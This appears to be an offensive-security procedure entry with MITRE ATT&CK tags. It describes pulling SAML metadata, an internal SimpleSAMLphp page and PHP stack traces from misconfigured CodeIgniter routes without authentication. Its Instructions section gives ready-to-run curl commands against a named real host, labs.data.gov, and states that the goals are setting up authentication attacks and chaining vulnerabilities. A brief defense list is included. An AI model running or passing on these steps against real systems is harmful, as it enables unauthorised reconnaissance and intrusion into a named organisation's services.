---
id: proc-uuid-7
tags:
  - route-misconfiguration
  - access-control
  - saml
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T03:46:09.346Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Access-Misconfigured-Routes-for-Disclosure

## Summary

This procedure directly invokes non-GUI controller functions via misconfigured routes in the CodeIgniter app, exposing sensitive data such as SAML metadata, welcome pages, and stack traces without authentication.

## Description

Due to improper route handling, endpoints like /dashboard/user/metadata return SAML XML, /dashboard/simplesaml/module.php/core/frontpage_welcome.php shows internal pages, and /dashboard/user/acs leaks traces. This builds on the overall access control flaw. Prerequisites: Knowledge of controller classes. Outcomes: Information disclosure aiding further exploits.

## Requirements

1. List of controller functions from source
2. Direct HTTP access to dashboard
3. Tools for fetching and parsing responses

## Defense

Defensive measures and detection strategies:

- Restrict routes to authenticated users with guards in CodeIgniter.
- Hide debug endpoints and SAML metadata behind auth.
- WAF rules to block direct controller invocations.

## Objectives

1. Access unauthorized internal functions.
2. Extract SAML metadata for auth attacks.
3. Reveal stack traces for vuln chaining.

## Instructions

### Step 1: Invoke SAML Metadata

**Context**: Fetch XML for potential token theft.

curl "https://labs.data.gov/dashboard/user/metadata"

> Expected: SAML metadata XML with entity IDs and endpoints.

### Step 2: Access SimpleSAML Page

**Context**: Reach internal welcome page.

curl "https://labs.data.gov/dashboard/simplesaml/module.php/core/frontpage_welcome.php"

> Expected: SimpleSAMLphp welcome content.

### Step 3: Trigger Stack Trace

**Context**: Cause error to leak traces.

curl "https://labs.data.gov/dashboard/user/acs"

> Expected: PHP stack trace with file paths and code snippets.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[information-disclosure]]
- [[misconfiguration]]
